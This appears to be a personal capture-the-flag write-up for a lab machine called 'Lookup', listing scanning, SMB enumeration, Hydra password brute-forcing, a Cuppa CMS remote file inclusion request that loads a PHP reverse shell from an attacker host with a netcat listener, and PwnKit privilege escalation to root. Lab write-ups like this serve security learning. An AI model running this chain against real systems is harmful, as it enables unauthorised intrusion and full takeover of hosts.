# Lookup-easy

 Reconnaissance:
Port and service scanning:


sudo nmap -sC -sV -oN squirrelmail.thm xxxx
Directory/file brute-forcing:


dirsearch -u http://xxxx -w /path/to/wordlist.txt
gobuster dir -u http://xxxx -w /path/to/wordlist.txt
Discovered SquirrelMail.

SMB Enumeration:

enum4linux → gathered usernames and information

smbmap → checked permissions, found log1.txt, log2.txt, log3.txt

Extracted hints from logs for password brute-forcing.

Access & Authentication
Used Hydra to brute-force passwords using usernames from enum4linux and smbmap.

Verified login endpoint with Burp Suite.

Found valid passwords → logged into SMB with another user.

Discovered a text file with a hint about a hidden directory.

Web Exploitation
Navigated to the hidden directory → initially empty.

Ran ffuf:


ffuf -u http://xxxx/FUZZ -w /path/to/wordlist.txt
Found /administrator/.

Identified Cuppa CMS.

Found RFI vulnerability in alertConfigField.php.

Exploit request:

http
GET /administrator/alerts/alertConfigField.php?urlConfig=http://ip_address:8080/php-reverse-shell.php
Set up listener:


nc -nlvp 8080
Gained a reverse shell.

Privilege Escalation
Ran linpeas.sh:


./linpeas.sh
Confirmed Ubuntu 16 vulnerable to PwnKit (CVE-2021-4034).

Exploited PwnKit → gained root access.

Guided Steps
After finding SquirrelMail, I followed a walkthrough for orientation.

Everything else (SMB, ffuf, Cuppa CMS, reverse shell, PwnKit) was done independently.

Notes & Takeaways
With SMB, always run enum4linux + smbmap → often reveals users and useful files.

Burp Suite helps to confirm endpoints for Hydra.

Older distros (like Ubuntu 16) are good candidates for quick PwnKit escalation.


For CMS (e.g., Cuppa), keep a checklist of known vulnerable endpoints.
